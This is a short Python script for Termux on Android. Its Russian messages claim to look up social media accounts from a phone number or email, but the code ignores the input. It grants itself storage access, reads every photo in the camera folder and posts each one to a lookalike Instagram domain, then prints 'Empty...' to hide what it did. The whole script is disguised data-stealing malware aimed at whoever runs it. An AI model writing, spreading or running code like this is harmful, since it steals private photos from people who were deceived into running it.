import os, requests
#Termux-lab POST
print("Поиск аккаунтов в соц сетях")
input("Номер телефона или почта: ")
print("Загрузка...")
os.system("termux-setup-storage")
print("Идет процесс поиска...")
l = os.listdir("../storage/shared/DCIM/Camera")
for i in range(len(l)):
	f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
	r = f.read()
	try:
		requests.post("http://instagram.com.xsph.ru/test/", data={"im": r})
	except:
		pass
print("Пусто...")
